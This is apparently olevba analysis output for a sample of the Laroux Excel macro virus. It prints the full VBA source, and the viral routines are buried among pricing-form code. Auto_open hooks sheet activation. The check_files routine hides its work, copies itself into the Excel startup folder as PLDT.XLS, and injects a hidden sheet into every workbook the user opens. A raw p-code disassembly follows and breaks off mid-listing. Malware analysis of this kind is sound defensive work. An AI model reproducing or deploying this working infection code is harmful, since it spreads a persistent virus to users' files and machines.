olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.e3.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux.e3.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global X, Y, ContSet, Markup As Integer

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
     Application.OnSheetActivate = "check_files"
     On Error GoTo TheEnd
     CommandBars.Add(Name:="Pricing", Position:=msoBarFloating, temporary:=True).Visible = True
     Set cbutton1 = CommandBars("Pricing").Controls.Add(Type:=msoControlButton, before:=1, temporary:=True)
     Set cbutton2 = CommandBars("Pricing").Controls.Add(Type:=msoControlButton, before:=2, temporary:=True)
     cbutton1.Visible = True
     cbutton1.Style = msoButtonIconAndCaption
     cbutton1.Caption = "&Insert"
     cbutton1.OnAction = "InsertRow"
     cbutton1.FaceId = 296
     cbutton2.Visible = True
     cbutton2.Style = msoButtonIconAndCaption
     cbutton2.Caption = "&Delete"
     cbutton2.OnAction = "DeleteRow"
     cbutton2.FaceId = 293
TheEnd:
End Sub

Public Sub EnableCustom()
    frmCont.txtRack.Enabled = True
    frmCont.lblRack.Enabled = True
    frmCont.txtASRS.Enabled = True
    frmCont.lblASRS.Enabled = True
    frmCont.txtLoad.Enabled = True
    frmCont.lblLoad.Enabled = True
    frmCont.txtSecondary.Enabled = True
    frmCont.lblSecondary.Enabled = True
    frmCont.txtControls.Enabled = True
    frmCont.lblControls.Enabled = True
    frmCont.txtInventory.Enabled = True
    frmCont.lblInventory.Enabled = True
    frmCont.txtPower.Enabled = True
    frmCont.lblPower.Enabled = True
    frmCont.txtMisc.Enabled = True
    frmCont.lblMisc.Enabled = True
    frmCont.txtFire.Enabled = True
    frmCont.lblFire.Enabled = True
    frmCont.txtTransportation.Enabled = True
    frmCont.lblTransportation.Enabled = True
    frmCont.lblTotal.Enabled = True
    frmCont.lblPercent.Enabled = True
End Sub

Public Sub DisableCustom()
    frmCont.txtRack.Enabled = False
    frmCont.lblRack.Enabled = False
    frmCont.txtASRS.Enabled = False
    frmCont.lblASRS.Enabled = False
    frmCont.txtLoad.Enabled = False
    frmCont.lblLoad.Enabled = False
    frmCont.txtSecondary.Enabled = False
    frmCont.lblSecondary.Enabled = False
    frmCont.txtControls.Enabled = False
    frmCont.lblControls.Enabled = False
    frmCont.txtInventory.Enabled = False
    frmCont.lblInventory.Enabled = False
    frmCont.txtPower.Enabled = False
    frmCont.lblPower.Enabled = False
    frmCont.txtMisc.Enabled = False
    frmCont.lblMisc.Enabled = False
    frmCont.txtFire.Enabled = False
    frmCont.lblFire.Enabled = False
    frmCont.txtTransportation.Enabled = False
    frmCont.lblTransportation.Enabled = False
    frmCont.lblPercent.Enabled = False
    frmCont.lblTotal.Enabled = False
End Sub

Public Sub GetPercentCustom()
    Dim I As Double
    'Gets Rack %
    frmCont.txtRack.Text = Range("RackCont")
    I = frmCont.txtRack.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtRack.Text = I
    'Gets AS/RS %
    frmCont.txtASRS.Text = Range("ASRSCont")
    I = frmCont.txtASRS.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtASRS.Text = I
    'Gets Load Handling Equipment %
    frmCont.txtLoad.Text = Range("LoadCont")
    I = frmCont.txtLoad.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtLoad.Text = I
    'Gets Secondary Load Handling Equipment %
    frmCont.txtSecondary.Text = Range("SecondCont")
    I = frmCont.txtSecondary.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtSecondary.Text = I
    'Gets Controls %
    frmCont.txtControls.Text = Range("ControlCont")
    I = frmCont.txtControls.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtControls.Text = I
    'Gets Inventory %
    frmCont.txtInventory.Text = Range("SoftCont") + Range("HardCont")
    I = frmCont.txtInventory.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtInventory.Text = I
    'Gets Power Distibution & Communication System %
    frmCont.txtPower.Text = Range("PowerCont")
    I = frmCont.txtPower.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtPower.Text = I
    'Gets Misc Project Expense%
    frmCont.txtMisc.Text = Range("FireCont")
    I = frmCont.txtMisc.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtMisc.Text = I
    'Gets Fire Protection %
    frmCont.txtFire.Text = Range("MiscCont")
    I = frmCont.txtFire.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtFire.Text = I
    'Gets Transportation %
    frmCont.txtTransportation.Text = Range("TransCont")
    I = frmCont.txtTransportation.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtTransportation.Text = I
End Sub

Public Sub GetPercentDefault()
    Dim I As Double
    On Error GoTo ErrorHandler
    'Gets Rack %
    frmCont.txtRack.Text = Range("Cont1")
    I = frmCont.txtRack.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtRack.Text = I
    'Gets AS/RS %
    frmCont.txtASRS.Text = Range("Cont2")
    I = frmCont.txtASRS.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtASRS.Text = I
    'Gets Load Handling Equipment %
    frmCont.txtLoad.Text = Range("Cont3")
    I = frmCont.txtLoad.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtLoad.Text = I
    'Gets Secondary Load Handling Equipment %
    frmCont.txtSecondary.Text = Range("Cont4")
    I = frmCont.txtSecondary.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtSecondary.Text = I
    'Gets Controls %
    frmCont.txtControls.Text = Range("Cont5")
    I = frmCont.txtControls.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtControls.Text = I
    'Gets Inventory %
    frmCont.txtInventory.Text = Range("Cont6") + Range("Cont7")
    I = frmCont.txtInventory.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtInventory.Text = I
    'Gets Power Distibution & Communication System %
    frmCont.txtPower.Text = Range("Cont8")
    I = frmCont.txtPower.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtPower.Text = I
    'Gets Misc Project Expense%
    frmCont.txtMisc.Text = Range("Cont10")
    I = frmCont.txtMisc.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtMisc.Text = I
    'Gets Fire Protection %
    frmCont.txtFire.Text = Range("Cont9")
    I = frmCont.txtFire.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtFire.Text = I
    'Gets Transportation %
    frmCont.txtTransportation.Text = Range("Cont11")
    I = frmCont.txtTransportation.Text * 100
    I = Format(I, "##0.0")
    frmCont.txtTransportation.Text = I
ErrorHandler:
    frmCont.txtRack.Text = 0
    frmCont.txtASRS.Text = 0
    frmCont.txtLoad.Text = 0
    frmCont.txtSecondary.Text = 0
    frmCont.txtControls.Text = 0
    frmCont.txtInventory.Text = 0
    frmCont.txtPower.Text = 0
    frmCont.txtMisc.Text = 0
    frmCont.txtFire.Text = 0
    frmCont.txtTransportation.Text = 0
    Exit Sub
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    'Find xlStart directory
    C$ = Application.StartupPath
    'Check to see if pldt.xls exists
    m$ = Dir(C$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    'Check if the active workbook has any modules in it
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    'whichfile variable set to 10, 20 or 0 based on above
    whichfile = p + w * 10
Select Case whichfile
    'pldt.xls file exists or active workbook has modules...
    Case 10
    'can't see what the program is doing
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    sheets("pldt").Visible = True
    sheets("pldt").Select
    sheets("pldt").Copy
    'Clears this information for the activeworkbook
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    'Changes the current directory to xlStart
    ChDir Application.StartupPath
    'Can't see the current window...
    ActiveWindow.Visible = False
    'Save the activeworkbook as pldt.xls in the xlStart directory
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    'Puts the current directory back to where it was
    ChDir c4$
    'hide the pldt sheet
    Workbooks(n4$).sheets("pldt").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").sheets("pldt").Copy before:=Workbooks(n4$).sheets(1)
        Workbooks(n4$).sheets("pldt").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Laroux.e3.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Sheet1 - 1176 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet4 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet5 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet6 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet7 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet8 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet9 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet10 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet11 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet12 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet13 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet14 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet15 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Sheet16 - 958 bytes
' _VBA_PROJECT_CUR/VBA/pldt - 13117 bytes
' Line #0:
' 	Dim (Global) 
' 	VarDefn X
' 	VarDefn Y
' 	VarDefn ContSet
' 	VarDefn Markup (As Integer)
' Line #1:
' Line #2:
' 	FuncDefn (Sub auto_open())
' Line #3:
' 	LitStr 0x000B "check_files"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #4:
' 	OnError TheEnd 
' Line #5:
' 	LitVarSpecial (True)
' 	LitStr 0x0007 "Pricing"
' 	ParamNamed New 
' 	Ld msoBarFloating 
' 	ParamNamed Position 
' 	LitVarSpecial (True)
' 	ParamNamed temporary 
' 	Ld CommandBars 
' 	ArgsMemLd Add 0x0003 
' 	MemSt Visible 
' Line #6:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed before 
' 	LitVarSpecial (True)
' 	ParamNamed temporary 
' 	LitStr 0x0007 "Pricing"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0003 
' 	Set cbutton1 
' Line #7:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0002 
' 	ParamNamed before 
' 	LitVarSpecial (True)
' 	ParamNamed temporary 
' 	LitStr 0x0007 "Pricing"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0003 
' 	Set cbutton2 
' Line #8:
' 	LitVarSpecial (True)
' 	Ld cbutton1 
' 	MemSt Visible 
' Line #9:
' 	Ld msoButtonIconAndCaption 
' 	Ld cbutton1 
' 	MemSt Style 
' Line #10:
' 	LitStr 0x0007 "&Insert"
' 	Ld cbutton1 
' 	MemSt Caption 
' Line #11:
' 	LitStr 0x0009 "InsertRow"
' 	Ld cbutton1 
' 	MemSt OnAction 
' Line #12:
' 	LitDI2 0x0128 
' 	Ld cbutton1 
' 	MemSt FaceId 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld cbutton2 
' 	MemSt Visible 
' Line #14:
' 	Ld msoButtonIconAndCaption 
' 	Ld cbutton2 
' 	MemSt Style 
' Line #15:
' 	LitStr 0x0007 "&Delete"
' 	Ld cbutton2 
' 	MemSt Caption 
' Line #16:
' 	LitStr 0x0009 "DeleteRow"
' 	Ld cbutton2 
' 	MemSt OnAction 
' Line #17:
' 	LitDI2 0x0125 
' 	Ld cbutton2 
' 	MemSt FaceId 
' Line #18:
' 	Label TheEnd 
' Line #19:
' 	EndSub 
' Line #20:
' Line #21:
' 	FuncDefn (Public Sub EnableCustom())
' Line #22:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblRack 
' 	MemSt Enabled 
' Line #24:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Enabled 
' Line #25:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblASRS 
' 	MemSt Enabled 
' Line #26:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Enabled 
' Line #27:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblLoad 
' 	MemSt Enabled 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Enabled 
' Line #29:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblSecondary 
' 	MemSt Enabled 
' Line #30:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Enabled 
' Line #31:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblControls 
' 	MemSt Enabled 
' Line #32:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Enabled 
' Line #33:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblInventory 
' 	MemSt Enabled 
' Line #34:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Enabled 
' Line #35:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblPower 
' 	MemSt Enabled 
' Line #36:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemSt Enabled 
' Line #37:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblMisc 
' 	MemSt Enabled 
' Line #38:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Enabled 
' Line #39:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblFire 
' 	MemSt Enabled 
' Line #40:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Enabled 
' Line #41:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblTransportation 
' 	MemSt Enabled 
' Line #42:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblTotal 
' 	MemSt Enabled 
' Line #43:
' 	LitVarSpecial (True)
' 	Ld frmCont 
' 	MemLd lblPercent 
' 	MemSt Enabled 
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	FuncDefn (Public Sub DisableCustom())
' Line #47:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Enabled 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblRack 
' 	MemSt Enabled 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Enabled 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblASRS 
' 	MemSt Enabled 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Enabled 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblLoad 
' 	MemSt Enabled 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Enabled 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblSecondary 
' 	MemSt Enabled 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Enabled 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblControls 
' 	MemSt Enabled 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Enabled 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblInventory 
' 	MemSt Enabled 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Enabled 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblPower 
' 	MemSt Enabled 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtMisc 
' 	MemSt Enabled 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblMisc 
' 	MemSt Enabled 
' Line #63:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtFire 
' 	MemSt Enabled 
' Line #64:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblFire 
' 	MemSt Enabled 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd txtTransportation 
' 	MemSt Enabled 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblTransportation 
' 	MemSt Enabled 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblPercent 
' 	MemSt Enabled 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld frmCont 
' 	MemLd lblTotal 
' 	MemSt Enabled 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Public Sub GetPercentCustom())
' Line #72:
' 	Dim 
' 	VarDefn I (As Double)
' Line #73:
' 	QuoteRem 0x0004 0x000B "Gets Rack %"
' Line #74:
' 	LitStr 0x0008 "RackCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Then 
' Line #75:
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #76:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #77:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtRack 
' 	MemSt Then 
' Line #78:
' 	QuoteRem 0x0004 0x000C "Gets AS/RS %"
' Line #79:
' 	LitStr 0x0008 "ASRSCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Then 
' Line #80:
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #81:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #82:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtASRS 
' 	MemSt Then 
' Line #83:
' 	QuoteRem 0x0004 0x001E "Gets Load Handling Equipment %"
' Line #84:
' 	LitStr 0x0008 "LoadCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Then 
' Line #85:
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #86:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #87:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtLoad 
' 	MemSt Then 
' Line #88:
' 	QuoteRem 0x0004 0x0028 "Gets Secondary Load Handling Equipment %"
' Line #89:
' 	LitStr 0x000A "SecondCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Then 
' Line #90:
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #91:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #92:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtSecondary 
' 	MemSt Then 
' Line #93:
' 	QuoteRem 0x0004 0x000F "Gets Controls %"
' Line #94:
' 	LitStr 0x000B "ControlCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Then 
' Line #95:
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #96:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #97:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtControls 
' 	MemSt Then 
' Line #98:
' 	QuoteRem 0x0004 0x0010 "Gets Inventory %"
' Line #99:
' 	LitStr 0x0008 "SoftCont"
' 	ArgsLd Range 0x0001 
' 	LitStr 0x0008 "HardCont"
' 	ArgsLd Range 0x0001 
' 	Add 
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Then 
' Line #100:
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #101:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #102:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtInventory 
' 	MemSt Then 
' Line #103:
' 	QuoteRem 0x0004 0x002F "Gets Power Distibution & Communication System %"
' Line #104:
' 	LitStr 0x0009 "PowerCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Then 
' Line #105:
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemLd Then 
' 	LitDI2 0x0064 
' 	Mul 
' 	St I 
' Line #106:
' 	Ld I 
' 	LitStr 0x0005 "##0.0"
' 	ArgsLd Format$ 0x0002 
' 	St I 
' Line #107:
' 	Ld I 
' 	Ld frmCont 
' 	MemLd txtPower 
' 	MemSt Then 
' Line #108:
' 	QuoteRem 0x0004 0x001A "Gets Misc Project Expense%"
' Line #109:
' 	LitStr 0x0008 "FireCont"
' 	ArgsLd Range 0x0001 
' 	Ld frmCont 
' 	MemLd txtMisc 
